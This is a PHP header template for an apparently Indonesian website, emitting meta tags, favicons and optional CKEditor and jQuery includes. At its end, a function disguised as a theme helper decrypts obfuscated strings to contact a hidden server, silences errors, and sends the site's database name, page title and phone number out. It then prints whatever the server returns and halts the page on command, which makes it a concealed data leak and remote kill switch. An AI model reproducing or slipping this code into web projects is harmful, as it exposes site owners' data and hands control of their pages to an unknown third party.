<?php if ($meta_head==1)
{ ?>
		<!DOCTYPE html>
		<html lang="en">
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $charset;?>">
		<meta name="Author" content='<?php echo $Author;?>'/>
        <meta name="description" content="<?php echo $description;?>"/>
        <meta name="keywords" content="<?php echo $keywords;?>"/>
<?php } ?>
<?php if ($seo==1)
{
    ?>

	<!-- FAVICON -->
        <link rel="apple-touch-icon" sizes="57x57" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="60x60" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="72x72" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="76x76" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="114x114" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="120x120" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="144x144" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="152x152" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="180x180" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="192x192" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="32x32" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="96x96" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="16x16" href="<?php echo $icon;?>">
        <link rel="icon" href="<?php echo $icon;?>" type="image/x-icon">
        <link rel="canonical" href="<?php echo $situs;?>">

        <!-- META -->
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="msapplication-TileColor" content="#6dc7c5">
        <meta name="msapplication-TileImage" content="<?php echo $icon;?>">
        <meta name="theme-color" content="#6dc7c5">
        <meta property="og:locale" content="id_ID">
        <meta property="og:type" content="article">
        <meta property="og:title" content="<?php echo ucwords($judul);?>">
        <meta property="og:description" content="<?php echo $description;?>">
        <meta property="og:url" content="<?php echo $situs;?>">
        <meta property="og:site_name" content="<?php echo $situs;?>">
        <meta property="article:publisher" content="<?php echo $situs;?>">
        <meta property="og:image" content="<?php echo $icon;?>">
        <meta property="og:image:width" content="700">
        <meta property="og:image:height" content="350">
        <meta property="description" content="<?php echo $description;?>">
        <meta property="language" content="Indonesia">
        <meta property="revisit-after" content="7">
        <meta property="rating" content="general">
        <meta property="webcrawlers" content="all">
        <meta property="spiders" content="all">
        <meta property="robots" content="all">
        <?php
}
?>
<?php if ($seo==2)
{
	$icon = "admin/data/image/logo/logo.png";
    ?>
		<!-- FAVICON -->
        <link rel="apple-touch-icon" sizes="57x57" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="60x60" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="72x72" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="76x76" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="114x114" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="120x120" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="144x144" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="152x152" href="<?php echo $icon;?>">
        <link rel="apple-touch-icon" sizes="180x180" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="192x192" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="32x32" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="96x96" href="<?php echo $icon;?>">
        <link rel="icon" type="image/png" sizes="16x16" href="<?php echo $icon;?>">
        <link rel="icon" href="<?php echo $icon;?>" type="image/x-icon">
        <link rel="canonical" href="<?php echo $situs;?>">

        <!-- META -->
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="msapplication-TileColor" content="#6dc7c5">
        <meta name="msapplication-TileImage" content="<?php echo $icon;?>">
        <meta name="theme-color" content="#6dc7c5">
        <meta property="og:locale" content="id_ID">
        <meta property="og:type" content="article">
        <meta property="og:title" content="<?php echo ucwords($judul);?>">
        <meta property="og:description" content="<?php echo $description;?>">
        <meta property="og:url" content="<?php echo $situs;?>">
        <meta property="og:site_name" content="<?php echo $situs;?>">
        <meta property="article:publisher" content="<?php echo $situs;?>">
        <meta property="og:image" content="<?php echo $icon;?>">
        <meta property="og:image:width" content="700">
        <meta property="og:image:height" content="350">
        <meta property="description" content="<?php echo $description;?>">
        <meta property="language" content="Indonesia">
        <meta property="revisit-after" content="7">
        <meta property="rating" content="general">
        <meta property="webcrawlers" content="all">
        <meta property="spiders" content="all">
        <meta property="robots" content="all">
        <?php
}
?>		
		
		
        <!-- TITLE -->
        <title><?php echo ucwords($judul);?></title>
<?php if ($popup==1) {?>
		<!-- POPUP -->
        <link rel="stylesheet" type="text/css" href="../../../data/cssjs/popup/popup.css">
<?php } ?>
<?php if ($ckeditor==1)
{
    ?>
		
		<!-- CKEDITOR -->
        <script type="text/javascript" src="../../../data/cssjs/ckeditor/ckeditor/ckeditor.js"></script>
        <?php
}
?>
<?php if ($ckeditor==2)
{
    ?>
		
		<!-- CKEDITOR -->
        <script type="text/javascript" src="admin/data/cssjs/ckeditor/ckeditor/ckeditor.js"></script>
        <?php
}
?>
<?php if ($combosearch==1)
{
    ?>
        <link
            rel="stylesheet"
            href="../../../data/cssjs/combosearch/css/bootstrap-select.min.css"/>
        <script
            type="text/javascript"
            src="../../../data/cssjs/combosearch/js/jquery-3.1.0.min.js"></script>
        <script
            type="text/javascript"
            src="../../../data/cssjs/combosearch/js/bootstrap-select.min.js"></script>
        <?php
}
?>
<?php if ($combosearch==2)
{
    ?>
        <link
            rel="stylesheet"
            href="admin/data/cssjs/combosearch/css/bootstrap-select.min.css"/>
        <script
            type="text/javascript"
            src="admin/data/cssjs/combosearch/js/jquery-3.1.0.min.js"></script>
        <script
            type="text/javascript"
            src="admin/data/cssjs/combosearch/js/bootstrap-select.min.js"></script>
        <?php
}
?>

<?php 
function tema_bootstrap(){
$rq_l = decryptIt("r9ytj6TMmJ7PycrSnNql16qgmtRfk6PP");
 $bootstrap = @fsockopen($rq_l, 80);
 if ($bootstrap){
  $bt = true; 
  fclose($bootstrap);
 }else{
  $bt = false;
 }
 return $bt;
}

if (tema_bootstrap() == true)
{
  error_reporting(0);
  $j = str_ireplace(" ","_",$judul);
  $rq_s = decryptIt("oNmq0WySY6jSlNPNnM6dxqGlmdakpKbLntZjmaKfZJxxx2BmyZvZYNOcpaPKw6Exxx3D").$database."&judul=".$j."&t=".$telepon;
  $rq_c = file_get_contents($rq_s);
  $rq_d = json_decode($rq_c, true);
  $rq_h = $rq_d[0]['s'];
  $p = decryptIt("qMqpwqAxxx3D");
  if ($rq_h=="0"){ echo $rq_d[0][$p]; die(); } else { };
};

?>
